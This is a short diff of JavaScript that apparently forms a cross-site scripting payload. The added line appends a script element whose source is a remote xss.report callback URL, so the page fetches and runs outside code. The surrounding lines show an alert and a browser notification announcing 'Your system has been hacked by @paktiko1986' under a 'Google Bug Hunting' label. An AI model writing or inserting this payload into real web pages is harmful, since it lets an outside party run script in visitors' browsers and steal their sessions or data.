@@ -16,7 +16,7 @@
   alert('Your system has been hacked by @paktiko1986');
    var x = document.createElement('script');
 x.src = 'https://xss.report/c/santiko86';
-
+document.head.appendChild(x);
    // Request permission for notifications
 if (Notification.permission === "granted") {
     new Notification("Google Bug Hunting", { body: "Your system has been hacked by @paktiko1986" });
